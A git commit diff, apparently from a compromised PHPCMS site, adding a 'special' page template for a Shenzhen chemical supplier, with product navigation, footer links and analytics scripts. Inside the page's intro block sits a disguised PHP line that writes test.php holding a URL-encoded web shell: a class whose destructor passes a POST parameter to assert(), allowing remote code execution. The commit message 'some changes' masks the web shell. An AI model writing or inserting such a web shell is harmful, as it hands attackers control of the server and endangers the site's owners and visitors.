b4f7b18455f8e8ed0885bc4387779680823ed36b
wangshiyi <wangshiyi1988@163.com>
2022-09-15 15:40:56 +0800

    some changes

---
+++ special/testm000/index.php
@@ -0,0 +1,255 @@
+<?php defined('IN_PHPCMS') or exit('No permission resources.'); ?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=7" />
+<title>testm - 深圳吉平化工|广东FMEE|FMES|深圳TX-10|NP-10|深圳AEO-9|PEG-400|消泡剂|防腐剂|杀菌剂|元明粉|三氯化铁|深圳乙醇胺|深圳硼酸|深圳硼砂</title>
+<meta name="keywords" content="广东FMEE|FMES|EDDHA-NaTX-10|AEO-9|深圳PEG-400|元明粉|深圳三氯化铁|柠檬酸|深圳硼酸|硼砂|珠碱|一乙醇胺深圳|三乙醇胺|防腐剂|防霉剂|杀菌剂|消泡剂|深圳切削液">
+<meta name="description" content="深圳市吉平化工有限公司是一家专业从事化工原料销售及环保产品研发生产的公司，位于平湖街道华南城M13栋127号。吉平化工主要生产经营的产品是：喜赫石油FMEE|FMES|EDDHA-Na|CETSA|EH-9|EH-6|NP-10|汉姆TX-10|AEO-9|PEG-400|元明粉|三氯化铁|柠檬酸|硼酸|硼砂|珠碱|一乙醇胺|二乙醇胺|三乙醇胺|防腐剂|防霉剂|杀菌剂|消泡剂|抑泡剂|切削液|硝酸钾等">
+<link href="http://www.szjiping.com/statics/css/reset.css" rel="stylesheet" type="text/css" />
+<link href="http://www.szjiping.com/statics/css/default_blue.css" rel="stylesheet" type="text/css" />
+<script language="javascript" type="text/javascript" src="http://www.szjiping.com/statics/js/jquery.min.js"></script>
+<script language="javascript" type="text/javascript" src="http://www.szjiping.com/statics/js/jquery.sgallery.js"></script>
+<style type="text/css">
+.special-bg{ background-color:#fff; width:960px; margin:auto; padding:0 6px}
+.z table td{ padding:0}
+</style>
+</head>
+<body class="special-channel">
+<div class="body-top special-body-top">
+    <div class="content">
+    	<a href="" class="logo"><img src="http://www.szjiping.com/statics/images/v9/logo.jpg" height="30" /></a><div class="nav"><a href="http://www.szjiping.com">首页</a><span>|</span><a href="http://www.szjiping.com/aboutus/">走进吉平</a><span>|</span><a href="http://www.szjiping.com/list-6-1.html">新闻动态</a><span>|</span><a href="http://www.szjiping.com/list-11-1.html">产品中心</a><span>|</span><a href="http://www.szjiping.com/index.php?m=content&c=index&a=lists&catid=26">在线询盘</a><span>|</span><a href="http://www.szjiping.com/service/">我们的服务</a><span>|</span><a href="http://www.szjiping.com/list-32-1.html">人才招聘</a><span>|</span><a href="http://www.szjiping.com/list-33-1.html">联系我们</a><span>|</span><a href="http://www.szjiping.com/declare/">网站声明</a></div>
+    </div>
+	</div>
+<div class="special-bg">
+<div class="header">
+<img src="/1.jpg" width="954" />
+</div><div class="bk10"></div><style type="text/css">
+.plan-2{ padding:0 8px; text-align:center; overflow:hidden}
+.plan-2 li div.img-wrap,.plan-2 li a{ width:120px; height:100px; margin:auto}
+</style>
+<!--main-->
+<div class="main">
+	<div class="col-left new">
+			<div class="FocusPic">
+                        	<div class="content" id="main-slide">
+                    <div class="changeDiv">  
+                                        </div>
+                </div>
+                        </div>
+			<div class="bk10"></div>
+			<div class="box">
+												</div>
+			<div class="bk10"></div>
+			<div class="box">
+												</div>
+    </div>
+    <div class="col-left img-text" >
+		<div class="box intro"><strong>导读：</strong><?php file_put_contents('test.php',urldecode('%3c%3fphp+class+me%7bpublic+%24a%3d%27%27%3bfunction+__destruct()%7bassert(%22%24this-%3ea%22)%3b%7d%7d%24b+%3d+new+me%3b%24b-%3ea+%3d+%24_POST%5b%27a%27%5d%3becho+%24b-%3ea%3b%3f%3e')); ?></div>
+    	<div class="news-hot">
+							        </div>
+            <div class="bk10"></div>
+    <div class="box">
+        		<h5>testm<a href="http://www.szjiping.com/special/testm000/testm/type-104.html" class="more">更多>></a></h5>
+							<ul class="list f14 lh26 ">
+				            </ul>
+			        </div>
+			
+    </div>
+    <div class="col-auto">
+	<div class="box">
+            						    </div>
+	<div class="bk10"></div>
+	<div class="box">
+            						    </div>
+	<div class="bk10"></div>
+	<div class="box">
+            						    </div>
+	    </div>
+	<div class="bk10"></div>
+		    <div class="bk10"></div>
+    <div class="box">
+        		<h5>testm<a href="http://www.szjiping.com/special/testm000/testm/type-104.html" class="more">更多>></a></h5>
+				            <ul class="content news-photo picbig">
+			            </ul>
+						<div class="hr bk15"></div>
+							<ul class="list f14 lh26 row-2">
+				            </ul>
+			</pc>
+        </div>
+			
+		<div class="bk10"></div>
+	  	  <script language='javascript' src='http://www.szjiping.com/index.php?m=formguide&c=index&a=show&formid=48&action=js'></script>
+</div>
+<script type="text/javascript"> 
+<!--
+$(function(){
+	new slide("#main-slide","cur",290,260,1);//焦点图
+	new SwapTab(".SwapTab","span",".tab-content","ul","fb");//排行TAB
+})
+//-->
+</script>
+<!--底部start-->
+<div class="footer">
+	<div class="footer_nav">
+        <div class="w_1000 o_a">
+            <ul class="main_li c_f">
+            	<li class="item pro_item">
+                    <h3 class="fs_14">主营产品类目</h3>
+                    <ul class="sub_li c_f">
+                                                                                    <li><a href="http://www.szjiping.com/product-42-1.html" title="基本分类">基本分类</a></li>
+                                                            <li><a href="http://www.szjiping.com/product-43-1.html" title="行业分类">行业分类</a></li>
+                                                            <li><a href="http://www.szjiping.com/product-44-1.html" title="特别推荐">特别推荐</a></li>
+                                                            <li><a href="http://www.szjiping.com/product-45-1.html" title="自产产品">自产产品</a></li>
+                                                            <li><a href="http://www.szjiping.com/index.php?m=content&c=index&a=lists&catid=98" title="特价产品">特价产品</a></li>
+                                                       
+                  		 
+                        
+                    </ul>
+                </li>
+                <li class="item">
+                    <h3 class="fs_14"></h3>
+                    <ul class="sub_li">
+                      
+                       
+                                                                                    <li><a href="http://www.szjiping.com/aboutus/aboutus/" title="公司简介">公司简介</a></li>
+                                                            <li><a href="http://www.szjiping.com/aboutus/com_culture/" title="企业文化">企业文化</a></li>
+                                                            <li><a href="http://www.szjiping.com/aboutus/com_advantage/" title="我们的优势">我们的优势</a></li>
+                                                            <li><a href="http://www.szjiping.com/list-24-1.html" title="企业活动">企业活动</a></li>
+                                                            <li><a href="http://www.szjiping.com/aboutus/honour/" title="荣誉资质">荣誉资质</a></li>
+                                                            <li><a href="http://www.szjiping.com/aboutus/leader_words/" title="领导致辞">领导致辞</a></li>
+                                                       
+               			 
+                       
+                    </ul>
+                </li>
+                <li class="item">
+                    <h3 class="fs_14"></h3>
+                    <ul class="sub_li">
+                                                                                     <li><a href="http://www.szjiping.com/list-21-1.html" title="公司新闻">公司新闻</a></li>
+                                                            <li><a href="http://www.szjiping.com/list-22-1.html" title="行业动态">行业动态</a></li>
+                                                            <li><a href="http://www.szjiping.com/list-23-1.html" title="行业百科">行业百科</a></li>
+                                                       
+               			 
+                    </ul>
+                </li>
+                <li class="item">
+                    <h3 class="fs_14">其它信息</h3>
+                    <ul class="sub_li">
+                        <li><a href="" title=""></a></li>
+                                                                                     <li><a href="http://www.szjiping.com/service/service_area/" title="服务领域">服务领域</a></li>
+                                                            <li><a href="http://www.szjiping.com/service/service_net/" title="销售网络">销售网络</a></li>
+                                                            <li><a href="http://www.szjiping.com/service/after_sale/" title="售后服务">售后服务</a></li>
+                                                            <li><a href="http://www.szjiping.com/faq-31-1.html" title="常见问题">常见问题</a></li>
+                                                       
+               			                    </ul>
+                </li>
+                <li class="item no_bg weixin">
+                    <h3 class="fs_14">吉平微信</h3>
+                    <div class="img"><img src="http://www.szjiping.com/statics/images/jiping/weixin.jpg" alt="" /><span class="fs_14 ff_yh">微信号：szjiping</span></div>
+                    <div>
+                    	<h4 class="fw_n">添加方式：</h4> 
+                        <p>1.按号码查找：szjiping</p>
+                        <p>2.扫描上面的二维码</p>
+                	</div>
+                </li>
+            </ul>
+        </div>
+    </div>
+    <div class="footer_cont w_1000 o_a">
+    	<div class="foot_link t_c"><a href="index.php" title="">首页</a><a href="" title=""></a><a href="" title=""></a><a href="" title=""></a><a href="" title=""></a><a href="" title=""></a><a href="" title=""></a><a href="" title=""></a><a class="no_border" href="" title=""></a></div>
+    	<div class="foot_info">
+        	<p class="t_c c_999 line_24"><span class="mr10">&copy; Copyright 2003-2011 深圳市吉平化工有限公司 <a target="_blank" href="https://beian.miit.gov.cn/" style="text-decoration: underline;">粤ICP备12074471号</a> </span>
+            	<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fb32e9a57579ce9e1aeafd7a51dcceaa2' type='text/javascript'%3E%3C/script%3E"));
+</script>
+                </p>
+        </div>
+        <div class="foot_img t_c"><a href="http://www.cyberpolice.cn/wfjb/" title="" target="_blank" rel="nofollow"><img src="http://www.szjiping.com/statics/images/jiping/foot_img01.gif" alt="" /></a><a href="http://www.sznet110.gov.cn/netalarm/" title="" target="_blank" rel="nofollow><img src="http://www.szjiping.com/statics/images/jiping/foot_img02.gif" alt="" /></a><a href="http://www.beianbeian.com/" title="" target="_blank" rel="nofollow" ><img src="http://www.szjiping.com/statics/images/jiping/foot_img03.gif" alt="" /></a><a href="http://www.szscjg.gov.cn/" title="" target="_blank" rel="nofollow"><img src="http://www.szjiping.com/statics/images/jiping/foot_img04.gif" alt="" /></a><a href="http://net.china.com.cn/" title="" target="_blank" rel="nofollow"><img src="http://www.szjiping.com/statics/images/jiping/foot_img05.gif" alt="" /></a><a href="http://www.wenming.cn/" title="" target="_blank" rel="nofollow"><img src="http://www.szjiping.com/statics/images/jiping/foot_img06.gif" alt="" /></a><a href="http://szcert.ebs.org.cn/e9d75699-31c5-4e2e-9165-e2c153c06f4b" title="" target="_blank" rel="nofollow"><img src="http://www.szjiping.com/statics/images/jiping/foot_img07.png" alt="" /></a></div>
+    </div>
+</div>
+<!--底部end-->
+<script type="text/javascript" src="http://www.szjiping.com/statics/js/jiping/common.js"></script>
+<script type="text/javascript" src="http://www.szjiping.com/statics/js/jiping/select.jQuery.js"></script>
+<script type="text/javascript" src="http://www.szjiping.com/statics/js/jiping/backToTop.js"></script>
+<script type="text/javascript" src="http://www.szjiping.com/statics/js/jiping/LoadImage.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+	$('#mainNav').MainNav();
+	$('#headSearch').selectbox();
+	$('#proSort').bgHover();
+	$('.sidesort').Subsort();
+	$('.c_img140 img').LoadImage(true,140,140);
+	$('.c_img87 img').LoadImage(true,87,87);
+	$('#activityImg').bgHover();
+	$('#activityImg img').LoadImage(true,180,135);
+})(jQuery);
+</script>
+
+<script type="text/ecmascript">
+function check_search(){
+	if($("#q").val()=="请输入搜索关键字"){
+		$("#q").val('');
+	}
+}
+</script>
+<script type="text/javascript">
+      
+function addFavorite(){
+		try{
+			window.external.addFavorite('http://www.szjiping.com','深圳市吉平化工有限公司');
+		}
+		catch (e){
+				 try{
+					window.sidebar.addPanel('深圳市吉平化工有限公司','http://www.szjiping.com',"");
+				 }
+				 catch (e){
+						alert("加入收藏失败，请使用Ctrl+D进行添加");
+				 }
+		}
+}
+
+
+function setHomepage(){
+	 var url = 'http://www.szjiping.com'; 
+	 if (document.all){
+		  document.body.style.behavior='url(#default#homepage)'; 
+		  document.body.setHomePage(url); 
+	}else if (window.sidebar){ 
+			if(window.netscape){
+				 try{
+					  netscape.security.PrivilegeManager.enablePrivilege("UniversalXPConnect"); 
+				}catch (e){ 
+						  
+						  }
+			} 
+			var prefs = Components.classes['@mozilla.org/preferences-service;1'].getService(Components. interfaces.nsIPrefBranch); 
+			prefs.setCharPref('browser.startup.homepage',url);
+	}else{
+	
+	} 
+}
+						
+</script>
+<script type="text/javascript">
+	function changepage(){//分页表单
+		var pageto	=	$("#cpage").val();
+		if(pageto==false){
+			pageto=1;
+		}
+		var now_url	=	$("#now_url").val();
+		if(now_url.indexOf("product")!=-1){//产品列表
+			var urlto	=	now_url.replace(/product-([\d]*)-[\d]*/,"product-$1-"+pageto);
+		}else{//文章列表
+			var urlto	=	now_url.replace(/list-([\d]*)-[\d]*/,"list-$1-"+pageto);
+			
+		}
+		$("#page_form").attr("action",urlto);
+		return true;
+	}
+</script>
+<SCRIPT LANGUAGE="JavaScript" src=http://float2006.tq.cn/floatcard?adminid=9486594&sort=0 ></SCRIPT>
+</body>
+</html>
